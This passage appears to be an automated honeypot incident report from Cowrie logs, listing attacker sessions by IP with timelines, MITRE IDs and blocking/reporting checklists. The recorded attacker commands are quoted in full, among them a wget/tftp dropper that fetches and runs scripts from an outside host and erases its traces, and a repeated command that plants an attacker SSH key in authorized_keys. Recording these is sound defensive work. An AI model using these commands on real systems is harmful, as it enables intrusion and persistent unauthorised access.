| `2026-07-02 21:54:36` | `cowrie.client.kex` |
| `2026-07-02 21:54:41` | `cowrie.login.success` |
| `2026-07-02 21:54:45` | `cowrie.session.params` |
| `2026-07-02 21:54:45` | `cowrie.command.input` |
| `2026-07-02 21:54:46` | `cowrie.log.closed` |
| `2026-07-02 21:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6170fbf8e0a

| Field | Detail |
|---|---|
| **Source IP** | `115.190.62[.]211` |
| **First Seen** | 2026-07-02 21:59 |
| **Last Seen** | 2026-07-02 22:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:59:51` | `cowrie.session.connect` |
| `2026-07-02 21:59:53` | `cowrie.telnet.option` |
| `2026-07-02 21:59:53` | `cowrie.telnet.option` |
| `2026-07-02 22:00:54` | `cowrie.login.success` |
| `2026-07-02 22:00:54` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `115.190.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `115.190.62[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660a2dbc5738

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]140` |
| **First Seen** | 2026-07-02 22:02 |
| **Last Seen** | 2026-07-02 22:02 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:02:16` | `cowrie.session.connect` |
| `2026-07-02 22:02:16` | `cowrie.login.success` |
| `2026-07-02 22:02:17` | `cowrie.session.params` |
| `2026-07-02 22:02:18` | `cowrie.command.input` |
| `2026-07-02 22:02:19` | `cowrie.command.input` |
| `2026-07-02 22:02:19` | `cowrie.session.file_download.failed` |
| `2026-07-02 22:02:33` | `cowrie.log.closed` |
| `2026-07-02 22:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]140` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f6c3cd97914

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 22:05 |
| **Last Seen** | 2026-07-02 22:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:05:36` | `cowrie.session.connect` |
| `2026-07-02 22:05:36` | `cowrie.client.version` |
| `2026-07-02 22:05:36` | `cowrie.client.kex` |
| `2026-07-02 22:05:37` | `cowrie.login.success` |
| `2026-07-02 22:05:38` | `cowrie.session.params` |
| `2026-07-02 22:05:38` | `cowrie.command.input` |
| `2026-07-02 22:05:39` | `cowrie.log.closed` |
| `2026-07-02 22:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74479cc2c25c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 22:06 |
| **Last Seen** | 2026-07-02 22:06 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:06:10` | `cowrie.session.connect` |
| `2026-07-02 22:06:11` | `cowrie.client.version` |
| `2026-07-02 22:06:11` | `cowrie.client.kex` |
| `2026-07-02 22:06:18` | `cowrie.login.success` |
| `2026-07-02 22:06:21` | `cowrie.session.params` |
| `2026-07-02 22:06:21` | `cowrie.command.input` |
| `2026-07-02 22:06:24` | `cowrie.log.closed` |
| `2026-07-02 22:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3f037765084

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 22:17 |
| **Last Seen** | 2026-07-02 22:18 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:17:49` | `cowrie.session.connect` |
| `2026-07-02 22:17:50` | `cowrie.client.version` |
| `2026-07-02 22:17:50` | `cowrie.client.kex` |
| `2026-07-02 22:17:57` | `cowrie.login.success` |
| `2026-07-02 22:18:01` | `cowrie.session.params` |
| `2026-07-02 22:18:01` | `cowrie.command.input` |
| `2026-07-02 22:18:03` | `cowrie.log.closed` |
| `2026-07-02 22:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-866a591560b5

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 22:19 |
| **Last Seen** | 2026-07-02 22:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:19:25` | `cowrie.session.connect` |
| `2026-07-02 22:19:25` | `cowrie.client.version` |
| `2026-07-02 22:19:25` | `cowrie.client.kex` |
| `2026-07-02 22:19:27` | `cowrie.login.success` |
| `2026-07-02 22:19:28` | `cowrie.session.params` |
| `2026-07-02 22:19:28` | `cowrie.command.input` |
| `2026-07-02 22:19:28` | `cowrie.log.closed` |
| `2026-07-02 22:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8905b8134236

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 22:29 |
| **Last Seen** | 2026-07-02 22:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:29:28` | `cowrie.session.connect` |
| `2026-07-02 22:29:30` | `cowrie.client.version` |
| `2026-07-02 22:29:30` | `cowrie.client.kex` |
| `2026-07-02 22:29:35` | `cowrie.login.success` |
| `2026-07-02 22:29:39` | `cowrie.session.params` |
| `2026-07-02 22:29:39` | `cowrie.command.input` |
| `2026-07-02 22:29:41` | `cowrie.log.closed` |
| `2026-07-02 22:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bd9f38bf94e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 22:29 |
| **Last Seen** | 2026-07-02 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:29:32` | `cowrie.session.connect` |
| `2026-07-02 22:29:32` | `cowrie.client.version` |
| `2026-07-02 22:29:32` | `cowrie.client.kex` |
| `2026-07-02 22:29:32` | `cowrie.login.success` |
| `2026-07-02 22:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12baf6b888b7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 22:29 |
| **Last Seen** | 2026-07-02 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:29:32` | `cowrie.session.connect` |
| `2026-07-02 22:29:32` | `cowrie.client.version` |
| `2026-07-02 22:29:32` | `cowrie.client.kex` |
| `2026-07-02 22:29:32` | `cowrie.login.success` |
| `2026-07-02 22:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14c631912521

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 22:29 |
| **Last Seen** | 2026-07-02 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:29:35` | `cowrie.session.connect` |
| `2026-07-02 22:29:35` | `cowrie.client.version` |
| `2026-07-02 22:29:35` | `cowrie.client.kex` |
| `2026-07-02 22:29:35` | `cowrie.login.success` |
| `2026-07-02 22:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbba98c8644b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 22:29 |
| **Last Seen** | 2026-07-02 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:29:35` | `cowrie.session.connect` |
| `2026-07-02 22:29:35` | `cowrie.client.version` |
| `2026-07-02 22:29:35` | `cowrie.client.kex` |
| `2026-07-02 22:29:35` | `cowrie.login.success` |
| `2026-07-02 22:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b61b1a886439

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 22:33 |
| **Last Seen** | 2026-07-02 22:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:33:31` | `cowrie.session.connect` |
| `2026-07-02 22:33:31` | `cowrie.client.version` |
| `2026-07-02 22:33:31` | `cowrie.client.kex` |
| `2026-07-02 22:33:32` | `cowrie.login.success` |
| `2026-07-02 22:33:34` | `cowrie.session.params` |
| `2026-07-02 22:33:34` | `cowrie.command.input` |
| `2026-07-02 22:33:34` | `cowrie.log.closed` |
| `2026-07-02 22:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f16f56db0584

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 22:34 |
| **Last Seen** | 2026-07-02 22:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:34:45` | `cowrie.session.connect` |
| `2026-07-02 22:34:45` | `cowrie.client.version` |
| `2026-07-02 22:34:45` | `cowrie.client.kex` |
| `2026-07-02 22:34:46` | `cowrie.login.success` |
| `2026-07-02 22:34:47` | `cowrie.session.params` |
| `2026-07-02 22:34:47` | `cowrie.command.input` |
| `2026-07-02 22:34:47` | `cowrie.log.closed` |
| `2026-07-02 22:34:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc00603bab46

| Field | Detail |
|---|---|
| **Source IP** | `106.13.39[.]89` |
| **First Seen** | 2026-07-02 22:38 |
| **Last Seen** | 2026-07-02 22:42 |
| **Session Duration** | 231s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:38:09` | `cowrie.session.connect` |
| `2026-07-02 22:38:09` | `cowrie.client.version` |
| `2026-07-02 22:38:09` | `cowrie.client.kex` |
| `2026-07-02 22:38:10` | `cowrie.login.success` |
| `2026-07-02 22:38:11` | `cowrie.session.params` |
| `2026-07-02 22:38:11` | `cowrie.command.input` |
| `2026-07-02 22:38:11` | `cowrie.command.failed` |
| `2026-07-02 22:38:12` | `cowrie.log.closed` |
| `2026-07-02 22:38:12` | `cowrie.session.params` |
| `2026-07-02 22:38:12` | `cowrie.command.input` |
| `2026-07-02 22:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.39[.]89` to AbuseIPDB if not already reported
- [ ] Block `106.13.39[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-581135ec8fa8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 22:41 |
| **Last Seen** | 2026-07-02 22:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:41:12` | `cowrie.session.connect` |
| `2026-07-02 22:41:14` | `cowrie.client.version` |
| `2026-07-02 22:41:14` | `cowrie.client.kex` |
| `2026-07-02 22:41:20` | `cowrie.login.success` |
| `2026-07-02 22:41:24` | `cowrie.session.params` |
| `2026-07-02 22:41:24` | `cowrie.command.input` |
| `2026-07-02 22:41:25` | `cowrie.log.closed` |
| `2026-07-02 22:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6846c420aa94

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 22:42 |
| **Last Seen** | 2026-07-02 22:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:42:47` | `cowrie.session.connect` |
| `2026-07-02 22:42:47` | `cowrie.client.version` |
| `2026-07-02 22:42:47` | `cowrie.client.kex` |
| `2026-07-02 22:42:48` | `cowrie.login.success` |
| `2026-07-02 22:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8f8a68b1b68

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 22:42 |
| **Last Seen** | 2026-07-02 22:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:42:47` | `cowrie.session.connect` |
| `2026-07-02 22:42:47` | `cowrie.client.version` |
| `2026-07-02 22:42:48` | `cowrie.client.kex` |
| `2026-07-02 22:42:48` | `cowrie.login.success` |
| `2026-07-02 22:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1616cad2b67d

| Field | Detail |
|---|---|
| **Source IP** | `58.20.201[.]4` |
| **First Seen** | 2026-07-02 22:44 |
| **Last Seen** | 2026-07-02 22:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:44:19` | `cowrie.session.connect` |
| `2026-07-02 22:44:19` | `cowrie.client.version` |
| `2026-07-02 22:44:19` | `cowrie.client.kex` |
| `2026-07-02 22:44:20` | `cowrie.login.success` |
| `2026-07-02 22:44:21` | `cowrie.session.params` |
| `2026-07-02 22:44:21` | `cowrie.command.input` |
| `2026-07-02 22:44:21` | `cowrie.command.failed` |
| `2026-07-02 22:44:22` | `cowrie.log.closed` |
| `2026-07-02 22:44:22` | `cowrie.session.params` |
| `2026-07-02 22:44:22` | `cowrie.command.input` |
| `2026-07-02 22:44:23` | `cowrie.session.file_download` |
| `2026-07-02 22:44:23` | `cowrie.log.closed` |
| `2026-07-02 22:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.20.201[.]4` to AbuseIPDB if not already reported
- [ ] Block `58.20.201[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ae2b16d208c

| Field | Detail |
|---|---|
| **Source IP** | `58.20.201[.]4` |
| **First Seen** | 2026-07-02 22:44 |
| **Last Seen** | 2026-07-02 22:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:44:23` | `cowrie.session.connect` |
| `2026-07-02 22:44:23` | `cowrie.client.version` |
| `2026-07-02 22:44:23` | `cowrie.client.kex` |
| `2026-07-02 22:44:24` | `cowrie.login.success` |
| `2026-07-02 22:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.20.201[.]4` to AbuseIPDB if not already reported
- [ ] Block `58.20.201[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cb9138bc273

| Field | Detail |
|---|---|
| **Source IP** | `58.20.201[.]4` |
| **First Seen** | 2026-07-02 22:44 |
| **Last Seen** | 2026-07-02 22:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:44:25` | `cowrie.session.connect` |
| `2026-07-02 22:44:25` | `cowrie.client.version` |
| `2026-07-02 22:44:25` | `cowrie.client.kex` |
| `2026-07-02 22:44:26` | `cowrie.login.success` |
| `2026-07-02 22:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.20.201[.]4` to AbuseIPDB if not already reported
- [ ] Block `58.20.201[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3977b5a1931d

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-02 22:45 |
| **Last Seen** | 2026-07-02 22:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:45:02` | `cowrie.session.connect` |
| `2026-07-02 22:45:02` | `cowrie.client.version` |
| `2026-07-02 22:45:03` | `cowrie.client.kex` |
| `2026-07-02 22:45:04` | `cowrie.login.success` |
| `2026-07-02 22:45:05` | `cowrie.session.params` |
| `2026-07-02 22:45:05` | `cowrie.command.input` |
| `2026-07-02 22:45:05` | `cowrie.command.failed` |
| `2026-07-02 22:45:05` | `cowrie.log.closed` |
| `2026-07-02 22:45:06` | `cowrie.session.params` |
| `2026-07-02 22:45:06` | `cowrie.command.input` |
| `2026-07-02 22:45:06` | `cowrie.session.file_download` |
| `2026-07-02 22:45:06` | `cowrie.log.closed` |
| `2026-07-02 22:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-567b7ad74b11

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-02 22:45 |
| **Last Seen** | 2026-07-02 22:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:45:07` | `cowrie.session.connect` |
| `2026-07-02 22:45:07` | `cowrie.client.version` |
| `2026-07-02 22:45:07` | `cowrie.client.kex` |
| `2026-07-02 22:45:08` | `cowrie.login.success` |
| `2026-07-02 22:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788c82ecf37d

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-02 22:45 |
| **Last Seen** | 2026-07-02 22:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:45:08` | `cowrie.session.connect` |
| `2026-07-02 22:45:08` | `cowrie.client.version` |
| `2026-07-02 22:45:09` | `cowrie.client.kex` |
| `2026-07-02 22:45:10` | `cowrie.login.success` |
| `2026-07-02 22:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4540a41428a5

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 22:47 |
| **Last Seen** | 2026-07-02 22:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:47:32` | `cowrie.session.connect` |
| `2026-07-02 22:47:32` | `cowrie.client.version` |
| `2026-07-02 22:47:32` | `cowrie.client.kex` |
| `2026-07-02 22:47:34` | `cowrie.login.success` |
| `2026-07-02 22:47:35` | `cowrie.session.params` |
| `2026-07-02 22:47:35` | `cowrie.command.input` |
| `2026-07-02 22:47:36` | `cowrie.log.closed` |
| `2026-07-02 22:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4ab4b312870

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
